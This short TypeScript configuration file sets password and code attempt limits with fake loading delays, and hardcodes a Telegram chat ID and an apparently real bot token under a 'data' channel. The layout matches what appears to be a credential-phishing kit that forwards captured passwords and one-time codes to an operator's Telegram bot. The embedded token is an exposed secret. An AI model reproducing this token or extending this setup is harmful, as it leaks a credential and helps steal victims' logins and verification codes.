interface Config {
  settings: {
    code_loading_time: number;
    max_failed_code_attempts: number;
    max_failed_password_attempts: number;
    password_loading_time: number;
  };
  telegram: {
    data_chatid: string;
    data_token: string;
  };
}
const defaultConfig: Config = {
  settings: {
    code_loading_time: 1000,
    max_failed_code_attempts: 3,
    max_failed_password_attempts: 3,
    password_loading_time: 1000,
  },
  telegram: {
    data_chatid: "1922578871",
    data_token: "8086831835:AAGp7bTGis_7WFTrDtIrzZI03_SOt-bUj2w",
  },
};
const getConfig = (): Config => {
  return defaultConfig;
};

export default getConfig;
